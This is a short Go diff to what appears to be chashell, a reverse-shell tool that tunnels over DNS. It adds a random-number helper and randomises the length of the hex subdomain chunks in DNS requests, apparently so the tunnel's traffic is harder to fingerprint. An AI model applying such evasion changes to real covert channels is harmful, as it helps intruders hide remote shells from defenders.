@@ -7,6 +7,7 @@ import (
 	"chashell/lib/protocol"
 	"chashell/lib/splitting"
 	"encoding/hex"
+	"math/rand"
 	"github.com/golang/protobuf/proto"
 	"strings"
 )
@@ -87,6 +88,11 @@ func Decode(payload string, encryptionKey string) (output []byte, complete bool)
 	return nil, false
 }
 
+func randInt(min int, max int) int {
+	rand.Seed(time.Now().UTC().UnixNano())
+	return min + rand.Intn(max-min)
+}
+
 func dnsMarshal(pb proto.Message, encryptionKey string, isRequest bool) (string, error) {
 	// Convert the Protobuf message to bytes.
 	packet, err := proto.Marshal(pb)
@@ -109,7 +115,7 @@ func dnsMarshal(pb proto.Message, encryptionKey string, isRequest bool) (string,
 	// If this is a DNS Request, subdomains cannot be longer than 63 chars
 	// We need to split the packet, then join it using "."
 	if isRequest {
-		packetHex = strings.Join(splitting.Splits(packetHex, 30), ".")
+		packetHex = strings.Join(splitting.Splits(packetHex, randInt(30, 50)), ".")
 	}
 
 	return packetHex, err
